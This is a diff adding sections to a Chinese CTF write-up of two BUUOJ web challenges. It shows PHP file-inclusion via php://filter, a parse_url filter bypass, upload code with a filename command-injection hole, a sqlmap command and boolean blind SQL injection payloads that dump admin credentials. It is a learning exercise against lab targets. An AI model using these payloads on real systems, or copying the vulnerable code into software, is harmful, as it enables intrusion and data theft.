@@ -2,7 +2,7 @@
 title: Buuoj WEB Write-up
 urlname: Buuoj-WEB-Write-up
 date: 2020-10-20 17:25:50
-updated: 2020-11-29 18:50:50
+updated: 2020-12-1 11:22:50
 comments: false
 tags: 
   - 
@@ -13,7 +13,9 @@ permalink:
 
 by:gyy
 
+刷题，buuoj记录
 
+<!--more-->
 
 ---
 
@@ -400,6 +402,582 @@ print (res)
 回去提交出flag
 
 ![image-20201129185017278](Buuoj-WEB-Write-up/image-20201129185017278.png)
+
+
+
+----
+
+
+
+# [N1CTF 2018]eating_cms
+
+打开就是登陆界面
+
+![image-20201129203609192](Buuoj-WEB-Write-up/image-20201129203609192.png)
+
+猜想SQL注入，发现过滤引号，暂时放弃这条路
+
+![image-20201129203656135](Buuoj-WEB-Write-up/image-20201129203656135.png)
+
+不给扫目录，盲猜访问`register.php`，还真有
+
+注册用户登陆进去
+
+![image-20201129203815847](Buuoj-WEB-Write-up/image-20201129203815847.png)
+
+发现url猫腻，文件包含，利用伪协议读取一下index
+
+![image-20201129203901945](Buuoj-WEB-Write-up/image-20201129203901945.png)
+
+```
+PD9waHAKcmVxdWlyZV9vbmNlICJmdW5jdGlvbi5waHAiOwppZihpc3NldCgkX1NFU1NJT05bJ2xvZ2luJ10gKSl7CiAgICBIZWFkZXIoIkxvY2F0aW9uOiB1c2VyLnBocD9wYWdlPWluZm8iKTsKfQplbHNlewogICAgaW5jbHVkZSAidGVtcGxhdGVzL2luZGV4Lmh0bWwiOwp9Cj8+
+```
+
+解密得index.php源码
+
+```php
+<?php
+require_once "function.php";
+if(isset($_SESSION['login'] )){
+    Header("Location: user.php?page=info");
+}
+else{
+    include "templates/index.html";
+}
+?>
+```
+
+再读一下user.php
+
+`user.php`
+
+```php
+<?php
+require_once("function.php");
+if( !isset( $_SESSION['user'] )){
+    Header("Location: index.php");
+
+}
+if($_SESSION['isadmin'] === '1'){
+    $oper_you_can_do = $OPERATE_admin;
+}else{
+    $oper_you_can_do = $OPERATE;
+}
+//die($_SESSION['isadmin']);
+if($_SESSION['isadmin'] === '1'){
+    if(!isset($_GET['page']) || $_GET['page'] === ''){
+        $page = 'info';
+    }else {
+        $page = $_GET['page'];
+    }
+}
+else{
+    if(!isset($_GET['page'])|| $_GET['page'] === ''){
+        $page = 'guest';
+    }else {
+        $page = $_GET['page'];
+        if($page === 'info')
+        {
+//            echo("<script>alert('no premission to visit info, only admin can, you are guest')</script>");
+            Header("Location: user.php?page=guest");
+        }
+    }
+}
+filter_directory();
+//if(!in_array($page,$oper_you_can_do)){
+//    $page = 'info';
+//}
+include "$page.php";
+?>
+```
+
+
+
+再读一下function.php
+
+`function.php`
+
+```php
+<?php
+session_start();
+require_once "config.php";
+function Hacker()
+{
+    Header("Location: hacker.php");
+    die();
+}
+
+
+function filter_directory()
+{
+    $keywords = ["flag","manage","ffffllllaaaaggg"];
+    $uri = parse_url($_SERVER["REQUEST_URI"]);
+    parse_str($uri['query'], $query);
+//    var_dump($query);
+//    die();
+    foreach($keywords as $token)
+    {
+        foreach($query as $k => $v)
+        {
+            if (stristr($k, $token))
+                hacker();
+            if (stristr($v, $token))
+                hacker();
+        }
+    }
+}
+
+function filter_directory_guest()
+{
+    $keywords = ["flag","manage","ffffllllaaaaggg","info"];
+    $uri = parse_url($_SERVER["REQUEST_URI"]);
+    parse_str($uri['query'], $query);
+//    var_dump($query);
+//    die();
+    foreach($keywords as $token)
+    {
+        foreach($query as $k => $v)
+        {
+            if (stristr($k, $token))
+                hacker();
+            if (stristr($v, $token))
+                hacker();
+        }
+    }
+}
+
+function Filter($string)
+{
+    global $mysqli;
+    $blacklist = "information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password";
+    $whitelist = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'(),_*`-@=+><";
+    for ($i = 0; $i < strlen($string); $i++) {
+        if (strpos("$whitelist", $string[$i]) === false) {
+            Hacker();
+        }
+    }
+    if (preg_match("/$blacklist/is", $string)) {
+        Hacker();
+    }
+    if (is_string($string)) {
+        return $mysqli->real_escape_string($string);
+    } else {
+        return "";
+    }
+}
+
+function sql_query($sql_query)
+{
+    global $mysqli;
+    $res = $mysqli->query($sql_query);
+    return $res;
+}
+
+function login($user, $pass)
+{
+    $user = Filter($user);
+    $pass = md5($pass);
+    $sql = "select * from `albert_users` where `username_which_you_do_not_know`= '$user' and `password_which_you_do_not_know_too` = '$pass'";
+    echo $sql;
+    $res = sql_query($sql);
+//    var_dump($res);
+//    die();
+    if ($res->num_rows) {
+        $data = $res->fetch_array();
+        $_SESSION['user'] = $data[username_which_you_do_not_know];
+        $_SESSION['login'] = 1;
+        $_SESSION['isadmin'] = $data[isadmin_which_you_do_not_know_too_too];
+        return true;
+    } else {
+        return false;
+    }
+    return;
+}
+
+function updateadmin($level,$user)
+{
+    $sql = "update `albert_users` set `isadmin_which_you_do_not_know_too_too` = '$level' where `username_which_you_do_not_know`='$user' ";
+    echo $sql;
+    $res = sql_query($sql);
+//    var_dump($res);
+//    die();
+//    die($res);
+    if ($res == 1) {
+        return true;
+    } else {
+        return false;
+    }
+    return;
+}
+
+function register($user, $pass)
+{
+    global $mysqli;
+    $user = Filter($user);
+    $pass = md5($pass);
+    $sql = "insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES ('$user','$pass','0')";
+    $res = sql_query($sql);
+    return $mysqli->insert_id;
+}
+
+function logout()
+{
+    session_destroy();
+    Header("Location: index.php");
+}
+
+?>
+```
+
+就这样根据源码的数据...读到了以下界面
+
+`config.php`
+
+```php
+<?php
+error_reporting(E_ERROR | E_WARNING | E_PARSE);
+define(BASEDIR, "/var/www/html/");
+define(FLAG_SIG, 1);
+$OPERATE = array('userinfo','upload','search');
+$OPERATE_admin = array('userinfo','upload','search','manage');
+$DBHOST = "localhost";
+$DBUSER = "root";
+$DBPASS = "Nu1LCTF2018!@#qwe";
+//$DBPASS = "";
+$DBNAME = "N1CTF";
+$mysqli = @new mysqli($DBHOST, $DBUSER, $DBPASS, $DBNAME);
+if(mysqli_connect_errno()){
+    echo "no sql connection".mysqli_connect_error();
+    $mysqli=null;
+    die();
+}
+?>
+```
+
+
+
+`guest.php`
+
+```php
+<?php
+if (FLAG_SIG != 1){
+    die("you can not visit it directly ");
+}
+include "templates/guest.html";
+?>
+```
+
+
+
+`info.php`
+
+```php
+<?php
+if (FLAG_SIG != 1){
+    die("you can not visit it directly ");
+}
+include "templates/info.html";
+?>
+```
+
+`ffffllllaaaaggg`被过滤
+
+##### 利用 `parse_url`解析漏洞 
+
+ 当url种出现下面这种情况的url，会解析错误，返回false
+`//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg` 
+
+
+
+`ffffllllaaaaggg.php`
+
+```php
+<?php
+if (FLAG_SIG != 1){
+    die("you can not visit it directly");
+}else {
+    echo "you can find sth in m4aaannngggeee";
+}
+?>
+```
+
+
+
+`m4aaannngggeee.php`
+
+```php
+<?php
+if (FLAG_SIG != 1){
+    die("you can not visit it directly");
+}
+include "templates/upload.html";
+
+?>
+```
+
+
+
+访问`./templates/upload.html`
+
+![image-20201129211243615](Buuoj-WEB-Write-up/image-20201129211243615.png)
+
+赶紧上传个，结果白高兴一场
+
+![image-20201129211356792](Buuoj-WEB-Write-up/image-20201129211356792.png)
+
+利用user.php再读`upllloadddd.php`
+
+```php
+<?php
+$allowtype = array("gif","png","jpg");
+$size = 10000000;
+$path = "./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/";
+$filename = $_FILES['file']['name'];
+if(is_uploaded_file($_FILES['file']['tmp_name'])){
+    if(!move_uploaded_file($_FILES['file']['tmp_name'],$path.$filename)){
+        die("error:can not move");
+    }
+}else{
+    die("error:not an upload file！");
+}
+$newfile = $path.$filename;
+echo "file upload success<br />";
+echo $filename;
+$picdata = system("cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/".$filename." | base64 -w 0");
+echo "<img src='data:image/png;base64,".$picdata."'></img>";
+if($_FILES['file']['error']>0){
+    unlink($newfile);
+    die("Upload file error: ");
+}
+$ext = array_pop(explode(".",$_FILES['file']['name']));
+if(!in_array($ext,$allowtype)){
+    unlink($newfile);
+}
+?>
+```
+
+
+
+访问`./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/`
+
+![image-20201129212543344](Buuoj-WEB-Write-up/image-20201129212543344.png)
+
+确认存在文件上传考点，回去找上传点，访问`./user.php?page=m4aaannngggeee`
+
+![image-20201129212613725](Buuoj-WEB-Write-up/image-20201129212613725.png)
+
+上传发现
+
+![image-20201129212720648](Buuoj-WEB-Write-up/image-20201129212720648.png)
+
+表明无法通过上传一句话木马获得shell
+
+后来分析代码发现漏洞
+
+#####  文件名代码执行漏洞
+
+![image-20201129212856576](Buuoj-WEB-Write-up/image-20201129212856576.png)
+
+扫目录
+
+![image-20201129213023625](Buuoj-WEB-Write-up/image-20201129213023625.png)
+
+flag即在`flag_233333`
+
+![image-20201129213121552](Buuoj-WEB-Write-up/image-20201129213121552.png)
+
+成功
+
+
+
+
+
+---
+
+# [Black Watch 入群题]Web
+
+打开
+
+![image-20201202104315913](Buuoj-WEB-Write-up/image-20201202104315913.png)
+
+有登陆，尝试登陆界面sql注入
+
+![image-20201202104343337](Buuoj-WEB-Write-up/image-20201202104343337.png)
+
+查看源码，在webpack发现猫腻
+
+![image-20201202104718292](Buuoj-WEB-Write-up/image-20201202104718292.png)
+
+登录界面注入无果![image-20201202104751986](Buuoj-WEB-Write-up/image-20201202104751986.png)
+
+转`content_list.php`
+
+发现请求文章时会带id参数，尝试注入
+
+![image-20201202105153401](Buuoj-WEB-Write-up/image-20201202105153401.png)
+
+![image-20201202105351447](Buuoj-WEB-Write-up/image-20201202105351447.png)
+
+确认存在注入
+
+过滤了`+` `空格` `and`
+
+![image-20201202105230126](Buuoj-WEB-Write-up/image-20201202105230126.png)
+
+ 输入数据库不存在的id或产生语法时没有回显，初步判断为布尔盲注
+
+##### 布尔盲注
+
+写个tamper替换空格等字符
+
+```shell
+python2 sqlmap.py -u "http://49a772d8-a3af-40d4-89c2-eaa7bc0fb974.node3.buuoj.cn/backend/content_detail.php?id=0"  --delay=0.07 --dbms=mysql --technique=B --tamper=mytamper.py --user-agent="chrome" --risk=3 --dump
+```
+
+参数：
+
+```
+--delay 延迟注入，网站快速注入会返回429，Too Many Requirements
+--dbms 数据库类型
+--technique 注入方式，这里B指bool布尔盲注
+--tamper 使用的tamper
+--user-agent 题目判断UA
+--risk 风险等级
+--dump 数据库全部拖下来
+```
+
+运行提示
+
+```shell
+[INFO] GET parameter 'id' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable
+```
+
+证实为布尔盲注
+
+![image-20201202110359111](Buuoj-WEB-Write-up/image-20201202110359111.png)
+
+发现跑出了数据库名`news`但跑不出表名
+
+![image-20201202110529783](Buuoj-WEB-Write-up/image-20201202110529783.png)
+
+参考师傅的答案，写脚本开始跑
+
+payload：
+
+```
+1^if((select(ascii(substr((select(database())),{},1))={})),1,0)^1#
+```
+
+一段一段分析
+
+```
+database() : 数据库
+(select(database()) : 选择数据库
+substr函数 : 指截取参数1字符串，从参数2的位置开始截取参数3位
+substr((select(database())),{},1) : 指从数据库名第{}的位置截取一位
+ascii(substr((select(database())),{},1)) : 指转化为ASCII码值
+select : 如下图所示
+select(ascii(substr((select(database())),{},1))={}) : select ascii={}，判断是否和某个ascii码值相等，如图
+if(a,1,0) : 相当于三目运算符 :? ,即 a:1?0
+^ : 异或符
+```
+
+
+
+![image-20201202112853423](Buuoj-WEB-Write-up/image-20201202112853423.png)
+
+
+
+![image-20201202112804610](Buuoj-WEB-Write-up/image-20201202112804610.png)
+
+
+
+![image-20201202112928978](Buuoj-WEB-Write-up/image-20201202112928978.png)
+
+
+
+很明显，第一个`{}`指的是数据库名的第i位，第二个`{}`指对第i的ASCII码值进行比较
+
+
+
+![image-20201202110930572](Buuoj-WEB-Write-up/image-20201202110930572.png)
+
+数据库名为`news`，继续跑表名
+
+payload：
+
+```
+1^if((select(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('news')),{},1))={})),1,0)^1#
+```
+
+
+
+![image-20201202113058557](Buuoj-WEB-Write-up/image-20201202113058557.png)
+
+再跑列名
+
+payload：
+
+```
+1^if((select(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)like('admin')),{},1))={})),1,0)^1#
+```
+
+
+
+![image-20201202113123832](Buuoj-WEB-Write-up/image-20201202113123832.png)
+
+跑数据了
+
+payload：
+
+```
+1^if((select(ascii(substr((select(group_concat(id))from(admin)),{},1))={})),1,0)^1#
+1^if((select(ascii(substr((select(group_concat(username))from(admin)),{},1))={})),1,0)^1#
+1^if((select(ascii(substr((select(group_concat(password))from(admin)),{},1))={})),1,0)^1#
+1^if((select(ascii(substr((select(group_concat(is_enable))from(admin)),{},1))={})),1,0)^1#
+
+```
+
+
+
+其实没必要跑那么多，（跑着好玩
+
+出来表有两行
+
+![image-20201202113806290](Buuoj-WEB-Write-up/image-20201202113806290.png)
+
+`username`：3ab8d14c,dcaf5eed
+
+![image-20201202114112390](Buuoj-WEB-Write-up/image-20201202114112390.png)
+
+`password`：2a790c21,f285e92a
+
+![image-20201202114324916](Buuoj-WEB-Write-up/image-20201202114324916.png)
+
+`is_enable`：0,1
+
+![image-20201202114435825](Buuoj-WEB-Write-up/image-20201202114435825.png)
+
+直接去拿enbale的登陆即可
+
+表结构是这样的
+
+
+
+数据库名:news
+
+表名:admin
+
+| id   | username | password | is_enable |
+| ---- | -------- | -------- | --------- |
+| 1    | 3ab8d14c | 2a790c21 | 0         |
+| 2    | dcaf5eed | f285e92a | 1         |
+
+
+
+登陆成功
+
+![image-20201202114303580](Buuoj-WEB-Write-up/image-20201202114303580.png)
 
 
 
